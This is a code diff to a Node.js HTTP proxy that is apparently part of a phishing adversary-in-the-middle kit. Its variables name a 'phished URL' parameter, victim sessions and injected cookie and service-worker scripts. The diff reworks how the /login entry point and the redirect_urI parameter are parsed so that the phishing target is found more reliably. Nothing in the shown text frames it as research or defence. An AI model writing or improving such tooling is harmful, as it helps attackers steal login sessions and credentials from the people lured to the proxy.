@@ -98,10 +98,12 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     }
 
     // ---- Parse URL to handle parameters in any order ----
-const parsedUrl = new URL(url, `http://${headers.host}`);
-if (parsedUrl.pathname === '/login' && parsedUrl.searchParams.has(PHISHED_URL_PARAMETER)) {
+// ---- ENTRY: /login with redirect_urI parameter ----
+if (url.startsWith('/login') && url.includes(PHISHED_URL_PARAMETER)) {
     try {
-        const phishedURL = new URL(decodeURIComponent(parsedUrl.searchParams.get(PHISHED_URL_PARAMETER)));
+        const query = url.split('?')[1] || '';
+        const params = new URLSearchParams(query);
+        const phishedURL = new URL(decodeURIComponent(params.get(PHISHED_URL_PARAMETER)));
         let session = currentSession;
 
         if (!currentSession) {
@@ -138,19 +140,20 @@ if (parsedUrl.pathname === '/login' && parsedUrl.searchParams.has(PHISHED_URL_PA
          url !== PROXY_PATHNAMES.script && 
          url !== PROXY_PATHNAMES.jsCookie && 
          url !== PROXY_PATHNAMES.mutation) {
-    // No session and not a known path – try to extract the target from referrer or current URL
+    // No session and not a known path – extract target from current URL
     let target = '';
     try {
-        const referer = headers.referer || '';
-        if (referer) {
-            const refUrl = new URL(referer);
-            target = refUrl.searchParams.get(PHISHED_URL_PARAMETER) || '';
-        }
+        const query = url.split('?')[1] || '';
+        const params = new URLSearchParams(query);
+        target = params.get(PHISHED_URL_PARAMETER) || '';
     } catch (e) {}
     if (!target) {
         try {
-            const currentUrl = new URL(url, `http://${headers.host}`);
-            target = currentUrl.searchParams.get(PHISHED_URL_PARAMETER) || '';
+            const referer = headers.referer || '';
+            if (referer) {
+                const refUrl = new URL(referer);
+                target = refUrl.searchParams.get(PHISHED_URL_PARAMETER) || '';
+            }
         } catch (e) {}
     }
     if (target) {
@@ -163,7 +166,7 @@ if (parsedUrl.pathname === '/login' && parsedUrl.searchParams.has(PHISHED_URL_PA
         clientResponse.end();
         return;
     }
-    }
+}
 
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
         if (url === PROXY_PATHNAMES.serviceWorker) {
